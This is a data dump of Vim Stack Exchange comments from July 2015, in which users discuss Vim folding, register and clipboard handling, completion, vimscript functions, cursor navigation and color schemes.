  <row Id="5427" PostId="3816" Score="0" Text="That's not a bad answer and I'm also guilty for not giving detailled enough question, no need to be sorry ;-)" CreationDate="2015-07-03T14:26:19.180" UserId="1841" />
  <row Id="5428" PostId="3818" Score="0" Text="So you go with `marker`. Indeed customizing `foldcolumn` is a nice thing to do, I'll see which value fits best on my need. Also I share your view on the split files but I didn't know `CtrlSF` I'll take a look at it even if I'm pretty happy with `CtrlP`." CreationDate="2015-07-03T14:30:44.203" UserId="1841" />
  <row Id="5429" PostId="3818" Score="0" Text="Also could you explain how to use the custom folding method please? I tried to set `fdm` to `foldtext` and `MyFoldText()` but it seems like it's not the right way to use it." CreationDate="2015-07-03T14:39:58.313" UserId="1841" />
  <row Id="5430" PostId="3818" Score="0" Text="@statox `CtrlSF` works best with [ag](https://github.com/ggreer/the_silver_searcher) or [ack](http://beyondgrep.com/), which are essentially specialized versions of `grep`.  `foldtext` is not a custom folding method, but a function to change the way folded text looks.  The last line in my snippet shows how it's used: `set foldtext=MyFoldText()`." CreationDate="2015-07-03T14:54:38.097" UserId="1577" />
  <row Id="5431" PostId="3818" Score="0" Text="Thanks I made it work and I like how it looks!" CreationDate="2015-07-03T15:10:53.213" UserId="1841" />
  <row Id="5433" PostId="3815" Score="3" Text="Note that mapping Ctrl+h in a terminal doesn't always work, as this is often the backspace key. See [this answer](https://vi.stackexchange.com/questions/3225/disable-esc-but-keep-c/3570#3570) and [this question](http://vi.stackexchange.com/q/3119/51)." CreationDate="2015-07-03T15:29:16.460" UserId="51" />
  <row Id="5434" PostId="3817" Score="0" Text="I mean `&quot;                                    {{{` with as many spaces in there as your `textwidth` so the markers are near the right edges. I do also have a personalized FoldText function in folding.vim file. I prefer separate files so that my git repo only one specific type of mod per commit." CreationDate="2015-07-03T15:39:57.603" UserId="2303" />
  <row Id="5435" PostId="3820" Score="0" Text="I can't test it right now but that seems to be an ideal solution to me! Thanks for sharing!" CreationDate="2015-07-03T17:15:25.717" UserId="1841" />
  <row Id="5436" PostId="3822" Score="0" Text="Just using `:let @+ .= 'XXX'` seems to work?" CreationDate="2015-07-04T06:56:37.423" UserId="51" />
  <row Id="5437" PostId="3822" Score="6" Text="@Carpetsmoker Yes and no.  There has been a recent discussion about it on vim_dev and apparently you aren't supposed to do that, even though it may appear to work under some conditions.  I presume it has to do with the register contents having a type (character / line / block), and string concatenation not doing the necessary bookkeeping.  It doesn't make any difference anyway, it still isn't a normal mode command." CreationDate="2015-07-04T07:02:17.847" UserId="1577" />
  <row Id="5438" PostId="3794" Score="0" Text="Cannot reproduce with a simple `[lots of spaces] import assert [newline and a lot of spaces] assert.` (then completion starts). That was tested with the Konsole terminal emulator on KDE (Arch Linux), vim 7.4.738, jedi-vim 0.7.0-154-gbce599f." CreationDate="2015-07-04T09:08:57.983" UserId="2698" />
  <row Id="5439" PostId="3655" Score="0" Text="`search()` is used elsewhere, but the search for which I want to use `n` and `N` is `normal /\[This option is yet to be written.\]`." CreationDate="2015-07-04T18:34:46.543" UserId="2511" />
  <row Id="5440" PostId="3676" Score="0" Text="Good to know. However, if vim works this way, why does the search wind up in the search history?" CreationDate="2015-07-04T18:40:22.657" UserId="2511" />
  <row Id="5441" PostId="3823" Score="1" Text="Would I put that let in my .vimrc file?" CreationDate="2015-07-04T21:24:20.003" UserId="2695" />
  <row Id="5442" PostId="3824" Score="3" Text="You can not &quot;set clipboard register to a different name&quot;. You are asking for some custom functionality written for you, that does something like this: when you append to a named register (e.g. using `Z`, i.e. append to `z`), to automatically *also* append to the clipboard register (`+`) - a kind of sync between a named register and `+` register. You had your answer here: http://vi.stackexchange.com/a/3823/1800, but based on your reply, you seem to want to make Vim bend to you without learning it first." CreationDate="2015-07-04T22:52:54.333" UserId="1800" />
  <row Id="5443" PostId="3325" Score="0" Text="I would imagine it pairs with argc==0 to check that a plain invocation of `vim` has been called. Then it opens NERDTree" CreationDate="2015-07-04T23:53:54.927" UserId="2143" />
  <row Id="5444" PostId="3823" Score="3" Text="Please note that `let @+ = @A` discards the type of register `a`.  The correct way to copy registers is something like this: `call setreg('+', getreg('a', 1, 1), getregtype('a'))`." CreationDate="2015-07-05T06:51:21.190" UserId="2313" />
  <row Id="5445" PostId="3811" Score="0" Text="Mhh this only seems to work inside of a CSS file, as soon as I switch to a different buffer (for example a HTML file) it only completes words with out the minus sign." CreationDate="2015-07-05T07:10:53.087" UserId="350" />
  <row Id="5446" PostId="3811" Score="0" Text="@RaphaelAhrens, see my edit." CreationDate="2015-07-05T07:51:27.560" UserId="54" />
  <row Id="5447" PostId="3811" Score="0" Text="@romainl I really appreciate your fast answer. But I'm sorry, I can't accept this answer since it will not scale with more file types and in addition it has the side-effects mentioned by Carpetsmoker. I hope you understand." CreationDate="2015-07-05T11:34:09.717" UserId="350" />
  <row Id="5448" PostId="3809" Score="0" Text="You say &quot;autocomplete&quot;, does this mean you are using YouCompleteMe, neocomplete, or something similar? If so, this should be mentioned in your question. If not, then you must be issuing some kind of completion command, such as `&lt;c-x&gt;&lt;c-n&gt;`, which should also be specified in your question." CreationDate="2015-07-05T13:47:37.027" UserId="21" />
  <row Id="5449" PostId="3830" Score="0" Text="Can you give an example? This sounds like [the meta tags in Javadoc](http://download.java.net/jdk7u2/docs/technotes/tools/solaris/javadoc.html#javadoctags)." CreationDate="2015-07-05T13:58:46.840" UserId="205" />
  <row Id="5450" PostId="3831" Score="1" Text="Can't you just run `:!./find_structs %`?" CreationDate="2015-07-05T14:17:02.643" UserId="205" />
  <row Id="5451" PostId="3831" Score="0" Text="Yes, but i want it to be inside vim so that i can run other operations like jump to struct definition using ctags." CreationDate="2015-07-05T14:21:53.167" UserId="2706" />
  <row Id="5452" PostId="3831" Score="2" Text="A plugin like this one might be more convenient: http://majutsushi.github.io/tagbar/" CreationDate="2015-07-05T14:27:06.047" UserId="205" />
  <row Id="5453" PostId="3809" Score="0" Text="@KarlYngveLervåg thank you for your comment. Please take a look at my edit." CreationDate="2015-07-05T15:15:26.980" UserId="350" />
  <row Id="5454" PostId="510" Score="0" Text="Consider switching to Neovim. It now has a built in terminal emulator which works quite well and can be open in a vim buffer." CreationDate="2015-07-05T15:49:24.697" UserId="1165" />
  <row Id="5455" PostId="3829" Score="0" Text="That is what I was looking for, a thorough explanation. Which you provided perfectly. Unfortunately when I see let and @ I hadn't known what they do but it just dawned on me when reading your response, thanks!" CreationDate="2015-07-05T16:32:21.310" UserId="2695" />
  <row Id="5456" PostId="3832" Score="0" Text="I can't see that such a function would make sense in an editor - but that, of course, doesn't mean there couldn't be a sensible application; and I'm certainly keen to know if there's any and why you are specifically asking for one. - Just one point: &quot;a rand() function **won't hurt**&quot; is just about the worst argument to introduce one." CreationDate="2015-07-05T17:56:08.997" UserId="2479" />
  <row Id="5457" PostId="3809" Score="1" Text="Your edit confirmed my suspicion. First, IMHO autocompletion should be automatic, and as such the problem you are describing is not with autocompletion, but merely with completion. For autocompletion in Vim I recommend you look at neocomplete or YouCompleteMe. Second, You are using Vim's generic KEYWORD completion. A keyword is defined by the option `'iskeyword'`, and even though keywords are used also for other commands (side effects), this is still the correct way to achieve what you want without using other kinds of (auto)completion." CreationDate="2015-07-05T18:02:49.010" UserId="21" />
  <row Id="5458" PostId="3809" Score="0" Text="@KarlYngveLervåg First I'm sorry for the misunderstanding. But I thought that autocompletion was the right term. Second could you then point me to something that solves my completion problem? As far as I can see YouCompleteMe and neocomplete don't change the completing behavior of the standard completion, they only add more &quot;auto&quot;, which I don't need. I really thought this would be possible with Vim." CreationDate="2015-07-05T19:02:39.947" UserId="350" />
  <row Id="5459" PostId="3832" Score="0" Text="@Janis: I agree that it is not necessarily a core feature of an editor. I'm using it to shuffle the letters of a string (really that's just to learn vimscript I will not say that this plugin will change the world). So I'm not specifically asking for it I was simply genuinely wondering why it isn't implemented. Your last point is totally fair that's not how a feature should be added in a software I can only agree with you :-)" CreationDate="2015-07-05T19:48:42.880" UserId="1841" />
  <row Id="5460" PostId="3834" Score="0" Text="Err, five years is a rather conservative estimate. :) Meanwhile, @christian-brabandt has gathered some of these patches in a [repository](https://github.com/chrisbra/vim-mq-patches).  There is a [rand_funtion](https://github.com/chrisbra/vim-mq-patches/blob/master/rand_function) among them." CreationDate="2015-07-05T19:55:53.990" UserId="2313" />
  <row Id="5461" PostId="3834" Score="0" Text="Wow 5 years in a TODO list... let's hope that a mature version of Neovim will solve this kind of things. Also does it mean that the maintainers would be ok to include the patch in vim but don't have the time to do so or that they just don't want the patch to be included (I'm not really aware of the way new features are included into vim). And finally interesting point, I didn't know the history of the vimscript (or VimL) name!" CreationDate="2015-07-05T19:56:20.167" UserId="1841" />
  <row Id="5462" PostId="3834" Score="0" Text="@statox Neovim did solve the problem of patches sitting in a queue for years.  Its the &quot;getting mature&quot; part that some people are skeptic about." CreationDate="2015-07-05T19:59:00.027" UserId="2313" />
  <row Id="5463" PostId="3833" Score="0" Text="Indeed the seems to follow the unix philosophy. By the way, the function you give in your answer works pretty good and it isn't listed in the answers of the [question](http://vi.stackexchange.com/questions/807/how-to-generate-random-numbers/) I'm referring to in my question, maybe you should add an answer that could be useful to other users :-)" CreationDate="2015-07-05T20:01:52.887" UserId="1841" />
  <row Id="5464" PostId="3834" Score="0" Text="@SatoKatsura: About the patch I had understood that they wanted to make the code more maintainable and easier to patch by a greater number of people, that's why I mentioned that. On the &quot;getting mature&quot; part I have to say that I haven't studied the project enough to have a real opinion about it." CreationDate="2015-07-05T20:04:43.340" UserId="1841" />
  <row Id="5465" PostId="3839" Score="2" Text="Well, let's change it then! ... grimscript? :P" CreationDate="2015-07-05T22:27:34.653" UserId="1800" />
  <row Id="5466" PostId="3731" Score="0" Text="Or, you can avoid re-reading the value by setting a global variable and checking that it exists (the same as plugins check to see if they're already loaded or not). E.g. https://github.com/mhinz/vim-randomtag/blob/master/autoload/randomtag.vim#L7, resp. https://github.com/mhinz/vim-randomtag/blob/master/autoload/randomtag.vim#L60" CreationDate="2015-07-05T22:30:20.247" UserId="1800" />
  <row Id="5467" PostId="3833" Score="0" Text="ok, i added the answer." CreationDate="2015-07-05T22:37:46.290" UserId="1800" />
  <row Id="5468" PostId="3833" Score="0" Text="And I upvoted it. Thanks!" CreationDate="2015-07-05T22:39:37.203" UserId="1841" />
  <row Id="5469" PostId="3834" Score="1" Text="To be fair, bug fixes are merged a lot faster, usually within a few days.  The vast majority of patches accepted for 7.3 and 7.4 (~2000 patches) have been bug fixes." CreationDate="2015-07-06T03:39:35.997" UserId="1577" />
  <row Id="5470" PostId="3839" Score="0" Text="Curious: has Bram Moolenar (did I spell that right?) ever discussed this in the mailing lists?" CreationDate="2015-07-06T05:15:05.400" UserId="205" />
  <row Id="5471" PostId="3841" Score="0" Text="Selecting a suggestion *always* leaves you in insert mode. Insert mode completion would be useless if it left you in normal mode after completion." CreationDate="2015-07-06T06:56:58.350" UserId="54" />
  <row Id="5472" PostId="3841" Score="0" Text="In the title and first paragraph you say you want to go to normal mode, but at the end of the first paragraph and in the last paragraph you say you want to go to insert mode. Which is it? O.o" CreationDate="2015-07-06T07:53:46.823" UserId="205" />
  <row Id="5473" PostId="3726" Score="0" Text="@Carpetsmoker [Neovim Issue opened](https://github.com/neovim/neovim/issues/2965)." CreationDate="2015-07-06T07:59:13.267" UserId="267" />
  <row Id="5474" PostId="3838" Score="0" Text="The question belongs here just fine, but I think others have got the sense that you're not willing to work with Vim. I have asked similar questions (http://vi.stackexchange.com/q/258/205, http://vi.stackexchange.com/q/2009/205), and got nice answers." CreationDate="2015-07-06T08:17:38.177" UserId="205" />
  <row Id="5475" PostId="3838" Score="0" Text="Notes: use `cd -` so that your working directory is restored. `cd` without any arguments will take you back to the home directory, `cd -` will take you back to wherever you were." CreationDate="2015-07-06T08:18:47.700" UserId="205" />
  <row Id="5476" PostId="3838" Score="1" Text="Also consider using `vim &quot;$@&quot;` so that you can pass additional arguments or commands to Vim." CreationDate="2015-07-06T08:19:25.803" UserId="205" />
  <row Id="5477" PostId="3842" Score="0" Text="Considering that two other files in the documentation use VimL without explanation, does either paragraph have any substance worth being in an answer?" CreationDate="2015-07-06T09:28:38.867" UserId="205" />
  <row Id="5478" PostId="3831" Score="0" Text="@muru: i would prefer a custom vim script than depending on an external plugin especially when you are running vim in an embedded environment." CreationDate="2015-07-06T09:46:27.463" UserId="2706" />
  <row Id="5479" PostId="3842" Score="0" Text="Thus they says both are valid names for vim scripting language. Either way, _VimScript_ has never been an official name for what we are speaking about." CreationDate="2015-07-06T10:25:33.027" UserId="626" />
  <row Id="5480" PostId="3841" Score="0" Text="I'm sorry I mistyped. I just want a way to autocomplete my word and then go into normal mode immediately after." CreationDate="2015-07-06T11:05:45.053" UserId="2655" />
  <row Id="5481" PostId="3781" Score="0" Text="I've tried this but `TextChangedI` doesn't seem to be firing.  I put the code in `~/vimfiles/plugin/pushleft.vim` and `~/vimfiles/vimrc`.  I started with `vim -u NONE` and manually sourced those two.  `:TogglePush` does print the enabled/disabled message, but text entry is normal even when push is enabled.  When I `set verbose=9`, I see `CursorMovedI` as text is entered.  When I hit Esc, I see `TextChanged`, but I never see `TextChangedI`.  Any thoughts?  Vim is `VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Aug 10 2013 14:33:40)`.  Thanks!" CreationDate="2015-07-06T12:51:59.400" UserId="1430" />
  <row Id="5483" PostId="3845" Score="0" Text="If everything is on one line, you can use `Xl` (where `X` is the number of characters) or the number of characters followed by Right arrow." CreationDate="2015-07-06T13:35:36.963" UserId="2698" />
  <row Id="5484" PostId="3844" Score="0" Text="Ctrl Y is what I was looking for, thank you!" CreationDate="2015-07-06T13:37:25.017" UserId="2655" />
  <row Id="5485" PostId="3846" Score="0" Text="Thanks for the answer. I'm really looking for moving forward X bytes, not chars though. Could you explain what your search pattern does, possibly with references to documentation?" CreationDate="2015-07-06T14:31:50.923" UserId="2720" />
  <row Id="5486" PostId="3846" Score="0" Text="Done. It is also possible to automate the `[count]go` process though in a vim function (read current byte offset, add desired number, `go` there)." CreationDate="2015-07-06T15:02:07.280" UserId="1800" />
  <row Id="5487" PostId="3830" Score="1" Text="In [`:help write-plugin`](http://vimhelp.appspot.com/usr_41.txt.html#write%2dplugin) some things are mentioned. The `@tag` notation is just done by some people who are used to it from other environments." CreationDate="2015-07-06T15:30:02.780" UserId="51" />
  <row Id="5489" PostId="3850" Score="0" Text="One question, does `col('.')` actually return the byte offset in the line?  Last I looked, it just showed the cursor column." CreationDate="2015-07-06T16:12:19.927" UserId="865" />
  <row Id="5490" PostId="3850" Score="0" Text="@EvergreenTree According to `:help col()`: _[t]he result is a Number, which is the byte index of the column position given with {expr}_.  I take it that's the 1-based byte offset..." CreationDate="2015-07-06T16:14:53.583" UserId="1577" />
  <row Id="5491" PostId="3850" Score="0" Text="Will the answer work in a file having this line only: `abcäb` ? (I haven't checked)" CreationDate="2015-07-06T16:14:53.767" UserId="1800" />
  <row Id="5492" PostId="3850" Score="1" Text="@VanLaser It works in my quick tests.  You tell us if it still works after extended testing." CreationDate="2015-07-06T16:16:26.743" UserId="1577" />
  <row Id="5493" PostId="3850" Score="0" Text="Just tested and it works :)" CreationDate="2015-07-06T16:17:58.547" UserId="1800" />
  <row Id="5494" PostId="3846" Score="0" Text="... added automated function and command." CreationDate="2015-07-06T16:57:41.173" UserId="1800" />
  <row Id="5495" PostId="3846" Score="0" Text="Thanks for the update, this starts to look good! There are two small differences between `[count]go` and your method: 1) `[count]go` adds an item to the jump list, so I can use `Ctrl+O` to quickly jump back to my previous position. 2) `[count]go` can be used without `:`, is it possible to introduce a new `[count]GO` that does your thing. Could you edit your answer to also match that behavior of `go`?" CreationDate="2015-07-06T17:08:18.037" UserId="2720" />
  <row Id="5496" PostId="3846" Score="0" Text="edited for both points" CreationDate="2015-07-06T17:19:26.767" UserId="1800" />
  <row Id="5497" PostId="3846" Score="0" Text="After changing `&lt;c-c&gt;` ti `GO`, your answer does exactly what I asked. Thanks! Small note: If I put your snippet in a single file (&quot;vimrcnew&quot;), and load it with `vim -u vimrcnew`, then the keybinding does not work (even though it works if I put it in my main `.vimrc`). Do you happen to know why that happens?" CreationDate="2015-07-06T17:27:56.920" UserId="2720" />
  <row Id="5498" PostId="3846" Score="0" Text="slightly edited answer - the cursor column was not the right one. Side effect: you have now only one jump back per line (should be ok for larger byte jumps). You probably need to use `set nocompatible` in your `vimrcnew` ?" CreationDate="2015-07-06T17:30:51.050" UserId="1800" />
  <row Id="5499" PostId="3846" Score="0" Text="... last edit (hopefully) - when used with argument 0 (no count), it re-uses the latest byte offset jump value." CreationDate="2015-07-06T17:37:30.447" UserId="1800" />
  <row Id="5500" PostId="3846" Score="0" Text="I've added an answer with my final solution. It's much shorter than your code and basically automates what I explained at the bottom of my question. Thanks for your help!" CreationDate="2015-07-06T17:39:58.767" UserId="2720" />
  <row Id="5501" PostId="3846" Score="0" Text="I had a strong feeling i was missing something :)" CreationDate="2015-07-06T17:41:19.067" UserId="1800" />
  <row Id="5502" PostId="3851" Score="4" Text="Can you provide an example where this happens? I would think this question is more suited as an issue for fugitive?" CreationDate="2015-07-06T20:01:39.463" UserId="21" />
  <row Id="5503" PostId="3852" Score="0" Text="One question, where exactly do you need this functionality? (BTW I ended up combining your solution with reusing the previous count if none is provided)." CreationDate="2015-07-06T20:38:08.797" UserId="1800" />
  <row Id="5504" PostId="3852" Score="1" Text="@VanLaser I was reading the raw contents of a PDF file, in order to get a better understanding of the PDF file format. A PDF file consists of many objects, and many of these objects have a length prefix. Being able to jump X bytes ahead was useful for debugging. And before you ask why I'm editing raw PDF files: I am developing a new feature for [PDF.js](https://github.com/mozilla/pdf.js) which requires a deeper knowledge of the PDF file format." CreationDate="2015-07-06T20:44:44.523" UserId="2720" />
  <row Id="5505" PostId="3852" Score="0" Text="Thanks for the answer (and good luck)! The combined version is here, if interested: http://pastebin.com/7sVyiA85" CreationDate="2015-07-06T20:55:44.210" UserId="1800" />
  <row Id="5506" PostId="3809" Score="1" Text="I might be wrong, but tag completion might work in this case. I do not personally do much web development, and so I am not that familiar with Vim for html/css/..., but I think that `ctags` should be able to generate tags for your project. Then you can do tag completion with `i_CTRL-X_CTRL-]`. However, I see in the docs that tag completion also uses the `iskeyword` option, so I might be wrong.&#xA;&#xA;In any case, you probably want to read `:h ins-completion`." CreationDate="2015-07-06T20:57:10.160" UserId="21" />
  <row Id="5507" PostId="3854" Score="2" Text="Does `:set lazyredraw` help?" CreationDate="2015-07-06T22:57:48.633" UserId="1800" />
  <row Id="5508" PostId="3854" Score="0" Text="Sorry, no. That only helps for macros. I just tried it, and it didn't work for my function." CreationDate="2015-07-07T06:19:31.613" UserId="2511" />
  <row Id="5509" PostId="3837" Score="0" Text="You people are geniuses." CreationDate="2015-07-07T06:47:03.637" UserId="2593" />
  <row Id="5510" PostId="3856" Score="4" Text="Definitely keep your fingers at `j,k,l,;`. For one, you'll learn to hit `h` in no time. Secondly, when you know vim better, you won't be using `h` all that much really. Thirdly, keybinds are mostly defined with that hand position in mind, so you'll just trade one problem for another set of problems in the long run." CreationDate="2015-07-07T06:54:05.207" UserId="1296" />
  <row Id="5511" PostId="3856" Score="2" Text="Don't bother. Vim has got much better cursor motion commands than `hjkl`. See `:help navigation`." CreationDate="2015-07-07T06:56:17.153" UserId="54" />
  <row Id="5512" PostId="3851" Score="3" Text="Is it possible that you have an issue with the end of line characters? When different people edit a file, some on windows and some on linux the end of line character are not the same and it can cause this kind of issue." CreationDate="2015-07-07T07:15:51.860" UserId="1841" />
  <row Id="5513" PostId="3858" Score="0" Text="Thanks for such a thorough answer!" CreationDate="2015-07-07T07:22:17.313" UserId="2732" />
  <row Id="5514" PostId="3858" Score="4" Text="The *&quot;use hjkl keys, arrow keys are evil&quot;*-dogma is a strong one in the Vi/Vim community, but in many ways it's also a silly one. Aside from the fact that I'm not at all convinced it is actually faster in all scenarios, even if it would be, is this *really* the most important thing about learning Vim? Or are there other things that will save you a lot more time (like motions, dealing with marks, registers, VimScript basics, etc.).... The whole &quot;hjkl&quot;-thing seems like a micro-optimisation at best." CreationDate="2015-07-07T08:06:53.070" UserId="51" />
  <row Id="5515" PostId="3858" Score="4" Text="I've been using computers for ~30 years.  Every 5 years or so I renew my attempts to learn to type &quot;properly&quot;.  So far, every single time I did that I also developed acute carpal tunnel syndrome symptoms within the first few days.  And every single time the symptoms went away as soon as I gave up and went back to my old habits.  I've also been doing martial arts for ~40 years, and never had any joint problems. My habits include using the arrow keys, and moving the hands a lot while typing.  The `hjkl` thing has never helped me.  What did help was buying good quality mechanical keyboards. FWIW." CreationDate="2015-07-07T08:10:15.673" UserId="1577" />
  <row Id="5516" PostId="3854" Score="2" Text="I don't know of any way to do this, other than perhaps freezing the terminal window (which won't work for gVim). But perhaps there is another way to make your function run with less screen updates? It would be helpful if you posted your function ;-)" CreationDate="2015-07-07T08:41:03.813" UserId="51" />
  <row Id="5517" PostId="3832" Score="1" Text="@Janis Some places where it would be useful in an editor: creating UUID's, creating uniquely named temp files/dirs (e.g. `mkstemp()`), creating &quot;secrets&quot; (many applications have a &quot;secret&quot; for encrypting cookies and whatnot)..." CreationDate="2015-07-07T09:04:32.530" UserId="51" />
  <row Id="5519" PostId="3861" Score="2" Text="The problem is, it has to evaluate the whole file. And replace `# =&gt;` on every line." CreationDate="2015-07-07T10:14:31.043" UserId="237" />
  <row Id="5520" PostId="3861" Score="1" Text="that is right, but for quick evaluation of a single line (as I first understand the question) this should work, I edited my answer" CreationDate="2015-07-07T10:16:10.190" UserId="1821" />
  <row Id="5522" PostId="3858" Score="0" Text="I answered the question because I read this a short time ago and I felt that it fitted well to the need of the OP. On the topic of hand placement, the french I am uses an AZERTY keyboard so the question doesn't actually exists: My left hand is on `hjkl` since the key on the right of `l` is `m` which is pretty useless. About the optimisation of using these keys to navigate I try to force myself to use the movements as much as I can but I still often use `hjkl`, I still feel it's faster than the arrow keys but I guess that its a pretty subjective topic." CreationDate="2015-07-07T10:33:53.000" UserId="1841" />
  <row Id="5525" PostId="3866" Score="0" Text="Also see: [How to join lines without producing a space?](http://vi.stackexchange.com/q/439/51)." CreationDate="2015-07-07T11:49:22.957" UserId="51" />
  <row Id="5526" PostId="3851" Score="0" Text="@KarlYngveLervåg - thank you for your comment. I'll try to show an example. The problem is that it's difficult to reproduce the problem. I'll monitor my workflow until the problem appears, so that to have more concrete steps." CreationDate="2015-07-07T12:23:57.620" UserId="2725" />
  <row Id="5527" PostId="3851" Score="0" Text="@statox - I am checking it." CreationDate="2015-07-07T12:24:33.607" UserId="2725" />
  <row Id="5528" PostId="3865" Score="0" Text="Now I'm curious about the first part and how `&lt;c-y&gt;` relates to the pop-up menu." CreationDate="2015-07-07T13:16:03.410" UserId="2736" />
  <row Id="5529" PostId="3865" Score="2" Text="See this answer: http://vi.stackexchange.com/a/3844/1800 . `Ctrl-y` in insert mode will complete the current popup selection, and the above mapping will allow `Enter` to complete too." CreationDate="2015-07-07T13:19:49.587" UserId="1800" />
  <row Id="5530" PostId="3865" Score="2" Text="Ah nifty, thanks." CreationDate="2015-07-07T13:27:48.873" UserId="2736" />
  <row Id="5531" PostId="3868" Score="0" Text="Perhaps try this, is very recent: http://www.kaoriya.net/software/vim/ - one of  the Win32 / Win64 links. You'll have to remove `vimrc` and `gvimrc` from the main vim folder after extracting the archive. I use the 64bit version." CreationDate="2015-07-07T13:55:37.410" UserId="1800" />
  <row Id="5532" PostId="3865" Score="0" Text="Nice trick.  However, I'd probably replace the last part `&quot;&lt;c-g&gt;u&lt;cr&gt;&quot;` by `&amp;paste ? &quot;&lt;cr&gt;&quot; : &quot;&lt;c-g&gt;u&lt;cr&gt;&quot;`, otherwise next time you paste by mistake 200 lines of HTML you'll have a lot of fun undoing it. :)" CreationDate="2015-07-07T14:51:11.140" UserId="1577" />
  <row Id="5533" PostId="3868" Score="0" Text="There are a few people that maintain up-to-date builds for Windows, you might want to ask about that on [vim_use](https://groups.google.com/forum/#!forum/vim_use)." CreationDate="2015-07-07T14:54:27.223" UserId="1577" />
  <row Id="5534" PostId="3864" Score="0" Text="&quot;Near the enter&quot; depends on your keyboard: UK ones have `\` next to the left-hand shift :-)" CreationDate="2015-07-07T15:58:56.253" UserId="2740" />
  <row Id="5535" PostId="3865" Score="0" Text="everything can be improved ;) never happened to me so far though (I usually paste from normal mode)" CreationDate="2015-07-07T16:16:04.070" UserId="1800" />
  <row Id="5536" PostId="3865" Score="0" Text="Actually, I just tested with `set paste` and ... it seems to do something &quot;magic&quot; itself, by undoing the whole insert session in one go (as if the `CR` insert mode mapping is ignored)" CreationDate="2015-07-07T16:40:57.817" UserId="1800" />
  <row Id="5537" PostId="3871" Score="0" Text="Wow!  Who would have thought that that would be so difficult in vim natively?  I really like the grep solution though.  Thanks!" CreationDate="2015-07-07T19:19:34.310" UserId="318" />
  <row Id="5538" PostId="3872" Score="0" Text="I can just have vim call grep... :)" CreationDate="2015-07-07T19:20:28.133" UserId="318" />
  <row Id="5539" PostId="3871" Score="0" Text="Most of the hard work is done in the `:s` command. It is actually a testament to the versatility of the `:s` command. However it does pale in comparison to how easy this job is with `grep`." CreationDate="2015-07-07T19:24:13.147" UserId="778" />
  <row Id="5540" PostId="3873" Score="1" Text="This is a better pure Vim way. However if you want to save the matches register without destroying the buffer, then the `:s` with sub-replace-expression is the way to go." CreationDate="2015-07-07T21:49:30.467" UserId="778" />
  <row Id="5541" PostId="3873" Score="0" Text="No doubt! It just seemed like a nice challenge." CreationDate="2015-07-07T21:56:40.847" UserId="1800" />
  <row Id="5542" PostId="3878" Score="0" Text="what does `&lt;silent&gt;`mean?" CreationDate="2015-07-08T02:39:02.107" UserId="2206" />
  <row Id="5543" PostId="3878" Score="0" Text="It prevents echoing anything to the status line. I'm pretty sure it doesn't do anything in this specific case, it was just there wherever I originally copied it from, long ago. See `:h map-silent`." CreationDate="2015-07-08T02:42:55.153" UserId="9" />
  <row Id="5544" PostId="3832" Score="0" Text="@Carpetsmoker; it's obvious that there's a lot places where random numbers are helpful. But you didn't explain why that would be a sensible feature *in an editor*. In my book, an editor is used to create and modify texts and not to perform shell tasks like creating temporary files. To obtain functions of external commands vi and vim also support a standard interface, so it seems unnecessary to implement every possible function in the editor. But, again; feel free to elaborate on the necessity for a built-in." CreationDate="2015-07-08T03:00:51.777" UserId="2479" />
  <row Id="5545" PostId="3851" Score="1" Text="I run into something that sounds like this when I'm looking at many diffs, one after another. What's happening is more than 2 files are in diff mode. You can disable diff mode in all buffers with `:bufdo diffoff`." CreationDate="2015-07-08T03:41:53.380" UserId="64" />
  <row Id="5546" PostId="3875" Score="0" Text="Take a look at: http://vim.wikia.com/wiki/Insert_newline_without_entering_insert_mode" CreationDate="2015-07-08T04:32:36.507" UserId="1892" />
  <row Id="5547" PostId="3879" Score="1" Text="As far as I can tell that's pretty much the only way." CreationDate="2015-07-08T06:32:06.790" UserId="1577" />
  <row Id="5548" PostId="3880" Score="2" Text="Note that mapping `&lt;S-Enter&gt;` doesn't work in terminal emulators (it only works in gVim).  So you'll need to choose a diffferent key combination to map it to ;-)" CreationDate="2015-07-08T07:42:41.333" UserId="51" />
  <row Id="5549" PostId="3874" Score="0" Text="Sweet, I didn't know about the `Ctrl-w`use in insert-mode. But the  Carpetsmoker♦ is still quicker. Thus the default binding of `Ctrl-\\`doesn't seems that useful." CreationDate="2015-07-08T07:44:30.080" UserId="1821" />
  <row Id="5550" PostId="3874" Score="1" Text="Ctrl+w is &quot;standard Vim&quot; ;-) See: [`:help i_CTRL-W`](http://vimhelp.appspot.com/insert.txt.html#i_CTRL%2dW). And pressing it twice seems to do the trick as well?" CreationDate="2015-07-08T07:44:46.417" UserId="51" />
  <row Id="5551" PostId="3874" Score="0" Text="I just saw on the help page that `&lt;C-u&gt;` may be more usefull as it deletes all the characters on the new line" CreationDate="2015-07-08T07:46:55.220" UserId="1821" />
  <row Id="5552" PostId="3879" Score="0" Text="OK... I will try to write one such script..." CreationDate="2015-07-08T08:48:57.287" UserId="2749" />
  <row Id="5553" PostId="3851" Score="0" Text="@tommcdo - your suggestion helped! Can you please format your comment as an answer, so that i can mark it as accepted? I am wondering though, is this a bug? I was just trying to commit a dozen or so files, and had to `:bufdo diffoff` twice, as the issue got reproduced twice with different files." CreationDate="2015-07-08T09:23:16.110" UserId="2725" />
  <row Id="5554" PostId="3882" Score="1" Text="have you tried downloading another color scheme ? you can find some on : http://vimcolors.com/" CreationDate="2015-07-08T10:39:24.000" UserId="1821" />
  <row Id="5556" PostId="3882" Score="1" Text="It may come as a surprise to you, but syntax files don't specify colours.  What you want to change is your _colours scheme_, not the syntax files. Messing with files in `/usr/share/vim/vim74` is likely to break vim.  Just pick a colour scheme and install that." CreationDate="2015-07-08T10:59:34.763" UserId="1577" />
  <row Id="5557" PostId="3882" Score="0" Text="Hmm, the color schemes look interesting, but I'm having trouble installing. I selected https://github.com/scheakur/vim-scheakur and then created `scheakur.vim` inside `~/.vim/colors`. After firing `vim`, I did `set background=light` and `colorscheme scheakur` when the whole (PHP) text became black! What could be wrong?" CreationDate="2015-07-08T11:07:34.857" UserId="2752" />
  <row Id="5558" PostId="3886" Score="1" Text="the `|` is good, but that doesn't work in `_vimrc` file. It would be ok if you replace it with `&lt;bar&gt;` (as the answer in stackoverflow suggest)" CreationDate="2015-07-08T11:08:09.700" UserId="2206" />
  <row Id="5559" PostId="3882" Score="0" Text="can you confirm that you want to change the colorscheme @dotslash ? Because with what you did we got confused ... Did you reset the previous `php.vim` ?" CreationDate="2015-07-08T11:09:13.637" UserId="1821" />
